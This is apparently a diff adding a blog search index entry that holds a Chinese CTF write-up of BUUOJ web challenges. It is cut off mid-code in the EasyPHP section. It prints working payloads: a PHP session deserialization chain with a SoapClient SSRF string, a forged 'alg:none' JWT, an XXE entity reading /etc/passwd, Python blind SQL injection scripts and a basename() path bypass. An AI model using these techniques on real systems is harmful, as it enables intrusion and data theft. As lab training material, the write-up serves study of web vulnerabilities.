@@ -1,6 +1,578 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUU-web七</title>
+    <url>/2020/07/14/buu-web-7/</url>
+    <content><![CDATA[<p><strong>bestphp’s revenge</strong><br>知识点：SESSION反序列化、php原生类ssrf</p>
+<p><strong>[HFCTF2020]EasyLogin</strong><br>知识点：jwt 伪造</p>
+<p><strong>NCTF2019]True XML cookbook</strong><br>知识点：xxe内网探测</p>
+<p><strong>[GYCTF2020]Ezsqli</strong><br>知识点：盲注，无列名注入</p>
+<p><strong>[ZerOpts2020]Can you guess it?</strong><br>知识点：basename()函数缺陷</p>
+<p><strong>[XNUCA2019Qualifier]EasyPHP</strong><br>知识点：.htaccess文件写入利用</p>
+<p><strong>[网鼎杯2018]Unfinish</strong><br>知识点：异或注入</p>
+<a id="more"></a>
+
+
+
+<h1 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h1><p>考点：SESSION反序列化、SSRF、PHP原生类利用</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h2><p><strong>call_user_func</strong></p>
+<p><code>call_user_func($filter, $value)</code>，这个函数的作用是把第一个参数作为回调函数调用</p>
+<p>例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">barber</span><span class="params">($type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You wanted a $type haircut, no problem\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="string">'barber'</span>, <span class="string">"mushroom"</span>);  <span class="comment">//输出You wanted a mushroom haircut, no problem</span></span><br><span class="line">call_user_func(<span class="string">'barber'</span>, <span class="string">"shave"</span>);  <span class="comment">//输出You wanted a shave haircut, no problem</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该函数不仅可以调用自定义函数，还可以调用php内置函数，比如extract</p>
+<p><strong>extract</strong><br>extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量<br><strong>当我们的第一个参数为数组时，会把第一个值当作类名，第二个值当作方法进行回调</strong></p>
+<p>例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"Original"</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"Cat"</span>,<span class="string">"b"</span> =&gt; <span class="string">"Dog"</span>, <span class="string">"c"</span> =&gt; <span class="string">"Horse"</span>);</span><br><span class="line">extract($my_array);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$a = $a; \$b = $b; \$c = $c"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$a = Cat; $b = Dog; $c = Horse</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SESSION反序列化"><a href="#SESSION反序列化" class="headerlink" title="SESSION反序列化"></a>SESSION反序列化</h2><p>参考文章：<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
+<p><strong>存储机制</strong></p>
+<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。<br>存储的文件是以<code>sess_sessionid</code>来进行命名的，文件的内容就是session值的序列话之后的内容。<br>假设我们的环境是xampp，那么默认配置如上所述。</p>
+<ul>
+<li><strong>在默认配置情况下：</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'CyzCc'</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/buu-web-7/1593336739916.png" alt="1593336739916"></p>
+<p>在D:\phpstudy_pro\wamp64\tmp中储存文件名是<code>sess_ac6df8h5uipildrmf4lm79agd7</code>，文件的内容是<code>name|s:5:&quot;CyzCc&quot;;</code>。name是键值，<code>s:5:&quot;CyzCc&quot;;</code>是<code>serialize(&quot;CyzCc&quot;)</code>的结果</p>
+<ul>
+<li><strong>在php_serialize引擎下</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set('session.serialize_handler', 'php_serialize');</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'CyzCc'</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/buu-web-7/1593336821405.png" alt="1593336821405"></p>
+<p>SESSION文件的内容是<code>a:1:{s:4:&quot;name&quot;;s:5:&quot;CyzCc&quot;;}</code>。<code>a:1</code>是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
+<ul>
+<li><strong>在php_binary引擎下：</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'CyzCc'</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>SESSION文件的内容是<code>names:5:&quot;CyzCc&quot;;</code>。由于<code>name</code>的长度是4，4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，最后就是<code>names:5:&quot;CyzCc&quot;;</code></p>
+<p><img src="/2020/07/14/buu-web-7/1593337592603.png" alt="1593337592603"></p>
+<p><strong>PHP Session中的序列化危害</strong></p>
+<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SESSION[<span class="string">'ryat'</span>] = <span class="string">'|O:11:"PeopleClass":0:&#123;&#125;'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上述的$_SESSION的数据使用<code>php_serialize</code>，那么最后的存储的内容就是<code>a:1:{s:5:&quot;CyzCc&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:{}&quot;;}</code>。<br>但是我们在进行读取的时候，选择的是<code>php</code>，那么最后读取的内容是:</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> (<span class="built_in">size</span>=<span class="number">1</span>)</span><br><span class="line">  <span class="string">'a:1:&#123;s:5:"CyzCc";s:24:"'</span> =&gt; </span><br><span class="line">    object(__PHP_Incomplete_Class)[<span class="number">1</span>]</span><br><span class="line">      <span class="keyword">public</span> <span class="string">'__PHP_Incomplete_Class_Name'</span> =&gt; <span class="keyword">string</span> <span class="string">'PeopleClass'</span> (length=<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这是因为当使用php引擎的时候，php引擎会以<strong>|</strong>作为作为key和value的分隔符，那么就会将<code>a:1:{s:5:&quot;CyzCc&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:{}</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。<br>这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
+<p><strong>实际利用</strong></p>
+<p>1.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">"CyzCc"</span>]=$_GET[<span class="string">"a"</span>];</span><br></pre></td></tr></table></figure>
+
+<p>22.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $hi;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hi = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在1.php和22.php中所使用的SESSION的引擎不一样，就形成了一个漏洞，1.php使<br>用<code>php_serialize</code>，22.php使用php来处理session</p>
+<p>访问1.php的时候，通过a传入<code>a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:13:&quot;echo &quot;12345&quot;;&quot;;}</code><br>此时生成的session为<br><code>a:1:{s:5:&quot;CyzCc&quot;;s:47:&quot;|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:13:&quot;echo &quot;12345&quot;;&quot;;}&quot;;}</code><br>这时候再去访问22.php，发现成功实例化了lemon这个类，并且执行了echo。因为在访问22.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法<br><img src="/2020/07/14/buu-web-7/1593339016638.png" alt="1593339016638"></p>
+<h2 id="php原生类进行ssrf"><a href="#php原生类进行ssrf" class="headerlink" title="php原生类进行ssrf"></a>php原生类进行ssrf</h2><p>由于源码中没有类，所以可以使用php原生类进行反序列化<br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0" target="_blank" rel="noopener">利用php原生类SoapClient中的__call方法进行SSRF</a></p>
+<p>解题思路：<br>利用回调函数覆盖session序列化引擎为php_serilaze，构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数call_user_func，此时结合我刚开始所说的回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>扫描目录得到flag.php，访问显示只能本地访问<br><img src="/2020/07/14/buu-web-7/1593341561897.png" alt="1593341561897"></p>
+<p>明显需要利用ssrf来进行攻击</p>
+<p><strong>利用回调函数覆盖session序列化引擎为php_serilaze</strong></p>
+<p><strong>构造SSRF的Soap类的序列化字符串</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; $url, <span class="string">'location'</span> =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"|"</span> . urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">|O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>通过上面覆盖的序列化引擎将该payload字符串写入session文件</p>
+<p><img src="/2020/07/14/buu-web-7/1593350945909.png" alt="1593350945909"></p>
+<p>此时session_start()序列化使用的是php引擎。接下来使用extract覆盖变量b，利用call_user_func调用SoapClient类中的不存在方法，触发__call方法，执行ssrf。并获得访问flag.php的PHPSESSID。</p>
+<p><img src="/2020/07/14/buu-web-7/1593351008912.png" alt="1593351008912"></p>
+<p>之后修改PHPSESSID即可获得flag<br><img src="/2020/07/14/buu-web-7/1593351044198.png" alt="1593351044198"></p>
+<p><strong>解析 payload</strong></p>
+<ol>
+<li>第一步，f传的值和post的值使其使用php_serialize引擎。而name的值就是将我们的name值以php_serialize引擎的格式存储起来。</li>
+<li>这次发的请求使用的是默认的php引擎，我们f传值和post传值来使<code>call_user_func($b, $a);</code>变成<code>call_user_func($a);</code>而$a 为一个数组且第一个值就是我们传入的SoapClient作为类，而第二个值<code>welcome_to_the_lctf2018</code>为方法，很显然没这个方法从而调用<code>SoapClient的__call</code>函数、执行ssrf。</li>
+<li>最后就是已我们设置的cookie去访问了，它会返回<code>$_SESSION</code>而此时我们的flag已经在里面了。</li>
+</ol>
+<p>参考文章：<br><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/</a></p>
+<p><a href="https://mayi077.gitee.io/2020/05/04/bestphp-s-revenge/" target="_blank" rel="noopener">https://mayi077.gitee.io/2020/05/04/bestphp-s-revenge/</a></p>
+<h1 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h1><p>考点：jwt 伪造</p>
+<p>打开题目为一个登陆框，可以注册用户</p>
+<p><img src="/2020/07/14/buu-web-7/1593417082681.png" alt="1593417082681"></p>
+<p>注册登录后猜测应该是需要admin登陆才能得到flag<br>先注册一个用户，在登陆的时候抓包<br><img src="/2020/07/14/buu-web-7/1593417187273.png" alt="1593417187273"></p>
+<p>发现有一个jwt格式的字符串，解密<br><img src="/2020/07/14/buu-web-7/1593417288861.png" alt="1593417288861"></p>
+<p>这里直接设置secretid为数组加密算法为空，修改username为admin即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"alg"</span>:<span class="string">"none"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;.</span><br><span class="line">&#123;<span class="string">"secretid"</span>:[],<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>,<span class="string">"iat"</span>:<span class="number">1589875776</span>&#125;.</span><br></pre></td></tr></table></figure>
+
+<p>将上面的字符串进行两次base64编码，之后拼接。每一段后面的<code>.</code>不能省略<br><img src="/2020/07/14/buu-web-7/1593417554134.png" alt="1593417554134"></p>
+<p>登陆成功</p>
+<p>点击getflag再抓包go一次即可<br><img src="/2020/07/14/buu-web-7/1593417607446.png" alt="1593417607446"></p>
+<h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>知识点：xxe探测内网<br><img src="/2020/07/14/buu-web-7/1593418704270.png" alt="1593418704270"></p>
+<p>题目给出为xxe，直接抓包构造payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY admin SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;admina&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/buu-web-7/1593418770073.png" alt="1593418770073"></p>
+<p>读取文件成功，之后读取/etc/hosts文件<br><img src="/2020/07/14/buu-web-7/1593418805402.png" alt="1593418805402"></p>
+<p>发现一个ip，使用http协议访问。显示不存在，之后通过burp去爆破发现<code>173.198.168.11</code>存在，访问得到flag</p>
+<p><img src="/2020/07/14/buu-web-7/1593418941330.png" alt="1593418941330"></p>
+<h1 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h1><p>知识点：盲注，无列名注入</p>
+<p>sql注入，只有一个输入框，进行抓包测试</p>
+<p><img src="/2020/07/14/buu-web-7/1593421986588.png" alt="1593421986588"></p>
+<p><img src="/2020/07/14/buu-web-7/1593422003553.png" alt="1593422003553"></p>
+<p><img src="/2020/07/14/buu-web-7/1593422047435.png" alt="1593422047435"></p>
+<p><img src="/2020/07/14/buu-web-7/1593422059257.png" alt="1593422059257"></p>
+<p>测试之后确定可以使用bool盲注，当条件不成立的时候回显<code>Error Occured When Fetch Result.</code><br>fuzz一下过滤的字符串<br><img src="/2020/07/14/buu-web-7/1593422138285.png" alt="1593422138285"></p>
+<p>可以先把数据库名跑出来</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://11de6aef-1432-4c03-9739-971d67b1f985.node3.buuoj.cn/index.php'</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (high + low) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload = <span class="string">"1 &amp;&amp; ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        payload2 = <span class="string">"1 &amp;&amp; ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema = database()),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data = data)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high) // <span class="number">2</span></span><br><span class="line">    result+=chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名为<code>give_grandpa_pa_pa_pa</code><br><img src="/2020/07/14/buu-web-7/1593423856311.png" alt="1593423856311"></p>
+<p>表名</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> &amp;&amp; ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),<span class="number">6</span>,<span class="number">1</span>))&gt;<span class="number">44</span></span><br></pre></td></tr></table></figure>
+
+<p>过滤了information.schema.tables，可以用sys.schema_table_statistics_with_buffer代替</p>
+<p>得到表名为：<code>f1ag_1s_h3r3_hhhhh</code><br>但是我们无法得到列名，这时候需要使用无列名注入</p>
+<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>参考文章：<a href="https://www.gem-love.com/ctf/1782.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1782.html</a></p>
+<p>这里用到了ascii位偏移</p>
+<p><img src="/2020/07/14/buu-web-7/1593427192361.png" alt="1593427192361"></p>
+<p><img src="/2020/07/14/buu-web-7/1593427039728.png" alt="1593427039728"></p>
+<p>payload：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://11de6aef-1432-4c03-9739-971d67b1f985.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        hexchar = flag + chr(char)</span><br><span class="line">        payload = <span class="string">'2||((select 1,"&#123;&#125;")&gt;(select * from f1ag_1s_h3r3_hhhhh))'</span>.format(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">'id'</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag转换为小写即可</p>
+<p>参考文章：<a href="https://blog.csdn.net/weixin_43940853/article/details/106164162" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43940853/article/details/106164162</a></p>
+<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));<span class="comment">//生成一串随机字符串</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>$_SERVER[‘PHP_SELF’]</strong></p>
+<blockquote>
+<p>获取当前 php 文件相对于网站根目录的位置地址</p>
+</blockquote>
+<p>当输入的guess与$secret相等时输出flag，但是几乎 不可能。<br>之后发现传入source之后可以highlight_file读取文件，并且过滤掉了config.php，所以这里应该是突破点。</p>
+<p><img src="/2020/07/14/buu-web-7/1593480992149.png" alt="1593480992149">)当我访问index.php/config.php时，浏览器仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码获取flag</p>
+<p>正则表达式<code>/config\.php\/*$/i</code>匹配的为$_SERVER[‘PHP_SELF’]的结尾，这里可以通过%0d进行污染绕过，这样仍然访问的index.php<br><img src="/2020/07/14/buu-web-7/1593486428166.png" alt="1593486428166"></p>
+<p>从 <a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=62119</a> 找到了basename()函数的一个问题，它会去掉文件名开头的非ASCII值：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(basename(<span class="string">"xffconfig.php"</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">"config.php/xff"</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造payload</p>
+<blockquote>
+<p>index.php/config.php/%ff?source</p>
+</blockquote>
+<p><img src="/2020/07/14/buu-web-7/1593487324170.png" alt="1593487324170"></p>
+<p>参考文章：<a href="https://blog.csdn.net/qq_43801002/java/article/details/105835367" target="_blank" rel="noopener">https://blog.csdn.net/qq_43801002/java/article/details/105835367</a></p>
+<h1 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h1><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span 